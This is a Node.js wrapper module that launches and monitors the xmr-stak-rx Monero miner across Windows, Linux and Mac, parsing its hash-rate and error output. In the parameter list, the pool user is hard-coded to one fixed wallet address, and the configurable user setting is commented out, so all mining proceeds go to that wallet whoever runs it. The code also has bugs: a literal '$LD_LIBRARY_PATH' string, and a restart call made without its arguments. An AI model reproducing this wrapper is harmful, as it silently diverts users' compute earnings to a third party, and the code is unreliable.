const { execFile } = require('child_process')
const EventEmitter = require('events')
const fs = require('fs')
const path = require('path')

const NEWLINE_SEPERATOR = /[\r]{0,1}\n/
const ANSI_REGEX = /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g

module.exports = () => {
  const module = new EventEmitter()
  module.isRunning = false
  module.proc = null

  module.parseLog = message => {
    const parts = message.toLowerCase().split(' ').filter(o => o)
    const log = message.split(' ').slice(3).join(' ').trim()

    if (parts[0] === 'totals' && parts[1] === '(all):' && parts[2]) {
      let hashRate = parseFloat(parts[2] || 0) || 0
      return { type: 'hashRate', hashRate }
    } if (parts[3] === 'error:') {
      const error = message.split(' ').slice(4).join(' ').trim()
      return { type: 'error', error }
    }

    return { type: 'log', message: log }
  }

  module.logBuffer = ''
  module.readLog = data => {
    module.logBuffer += data.toString()
    const split = module.logBuffer.split(NEWLINE_SEPERATOR)
    split.forEach(o => {
      const log = module.parseLog(o.replace(ANSI_REGEX, ''))
      module.emit('log', log)
    })
    module.logBuffer = split[split.length - 1]
  }

  module.start = (ctx, env) => {
    module.isRunning = true
    if (module.proc) {
      return
    }

    let executable
    if (ctx.workload.platform === 'win') {
      executable = path.resolve(ctx.workloadDir, 'xmr-stak-rx.exe')
      env.PATH = `${env.PATH};${ctx.workloadDir}`
    } else if (ctx.workload.platform === 'linux') {
      executable = path.resolve(ctx.workloadDir, 'xmr-stak-rx')
      env.LD_LIBRARY_PATH = `$LD_LIBRARY_PATH:${ctx.workloadDir}`
    } else if (ctx.workload.platform === 'mac') {
      executable = path.resolve(ctx.workloadDir, 'xmr-stak-rx')
    }

    const params = [
      '-o', `${ctx.workload.host}:${ctx.workload.port}`,
      '-u', '47wcnDjCDdjATivqH9GjC92jH9Vng7LCBMMxFmTV1Ybf5227MXhyD2gXynLUa9zrh5aPMAnu5npeQ2tLy8Z4pH7461vk6uo',//ctx.poolUser,
      '-p', 'x',
      '-r', 'worker',
      '--noTest',
      '--h-print-time', 1,
      '--currency', ctx.workload.algorithmId
    ]

    if (ctx.workload.architecture === 'cpu') {
      params.push('--noAMD')
      params.push('--noNVIDIA')
    } else if (ctx.workload.architecture === 'nvidia') {
      params.push('--noAMD')
      params.push('--noCPU')
    } else if (ctx.workload.architecture === 'amd') {
      params.push('--noCPU')
      params.push('--noNVIDIA')
    }

    try {
      fs.accessSync(executable, fs.constants.R_OK)
      module.proc = execFile(executable, params, {
        silent: true,
        env
      })
    } catch (err) {
      module.emit('error', err.toString())
      module.emit('exit')
      return
    }

    // Pass through and console output or errors to event emitter
    module.proc.stdout.on('data', data => module.readLog(data))
    module.proc.stderr.on('data', data => module.emit('error', data.toString()))

    // Update state when kill has completed and restart if it has already been triggered
    module.proc.on('exit', code => {
      if (code) {
        module.isRunning = false
      } else if (module.isRunning) {
        module.start()
      }

      module.proc = null
      module.emit('exit', code)
    })

    module.proc.on('error', err => {
      module.emit('error', err)
    })

    module.emit('start', params)
  }

  module.stop = signal => {
    module.isRunning = false

    // Start killing child process
    if (module.proc) {
      module.proc.kill(signal)
    }
  }

  // Ensure miner is stopped once process closes
  process.on('exit', () => {
    if (module.proc) {
      module.proc.kill()
    }
  })

  return module
}
